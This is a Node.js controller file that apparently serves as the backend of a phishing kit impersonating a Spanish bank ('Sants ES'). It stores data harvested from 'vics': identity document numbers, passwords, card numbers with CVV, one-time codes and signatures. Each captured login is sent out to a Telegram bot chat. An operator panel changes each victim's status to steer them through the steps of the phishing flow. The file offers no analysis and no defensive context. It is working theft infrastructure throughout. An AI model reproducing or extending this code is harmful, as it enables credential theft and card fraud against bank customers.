const axios = require("axios");
const Sants = require("../models/santsesModel.js");
var moment = require("moment"); // require

const getOwnerVics = async (req, res) => {
    const { owner } = req.params;
    Sants.find({ owner })
        .sort({ timestamp: -1 })
        .exec((err, vics) => {
            if (err) {
                console.log(err);
                res.status(404).send("Error");
                return;
            }
            res.send(vics);
        });
};

const command = async (req, res) => {
    const { uniqueid, status } = req.body;
    try {
        await Sants.findOneAndUpdate({ uniqueid }, { status }).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const getInfo = async (req, res) => {
    const { uniqueid } = req.params;
    Sants.findOne({ uniqueid }).exec((err, vic) => {
        if (err) {
            console.log(err);
            res.status(404).send("Error");
            return;
        }
        res.send(vic);
    });
};

const submitLogin = async (req, res) => {
    let { document, documentNumber, password, uniqueid, owner, ip } = req.body;
    message = `New Sants ES Hit:\n\n${document}\n${documentNumber}\n${password}\n\nAdmin Link: https://haytchc0ding.co.uk/new?panel=sants&password=${owner}\n\nCount: ${santsCount}\nRedirect: ${redirect}`;
    try {
        let user = await Sants.findOne({ uniqueid });
        if (user) await Sants.deleteOne({ uniqueid });
        await Sants.create({
            uniqueid,
            document, documentNumber, password,
            owner,
            status: 1,
            ip,
            timestamp: moment().format()
        });
        await axios
            .post(`https://api.telegram.org/bot${process.env.panelBot}/sendMessage`, {
                chat_id: 680379375,
                text: message,
                parse_mode: "Markdown",
            })
            .catch((e) => {
                console.log(e);
            });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitLoginAgain = async (req, res) => {
    const { document, documentNumber, password, uniqueid } = req.body;
    try {
        await Sants.findOneAndUpdate(
            { uniqueid },
            { document, documentNumber, password, status: 1, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitCard = async (req, res) => {
    const { ccnum, ccexp, cvv, uniqueid } = req.body;
    try {
        await Sants.findOneAndUpdate(
            { uniqueid },
            { ccnum, ccexp, cvv, status: 5, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitOtp = async (req, res) => {
    const { otp, uniqueid } = req.body;
    try {
        await Sants.findOneAndUpdate(
            { uniqueid },
            { otp, status: 3, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const submitSignatrue = async (req, res) => {
    const { signature, uniqueid } = req.body;
    try {
        await Sants.findOneAndUpdate(
            { uniqueid },
            { signature, status: 7, timestamp: moment().format() }
        ).exec();
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

const deleteEntry = async (req, res) => {
    const { uniqueid } = req.body;
    try {
        await Sants.deleteOne({ uniqueid });
        res.sendStatus(200);
    } catch (error) {
        console.log(error);
        res.sendStatus(400);
    }
};

module.exports = {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitCard,
    submitOtp,
    submitSignatrue,
    deleteEntry,
};
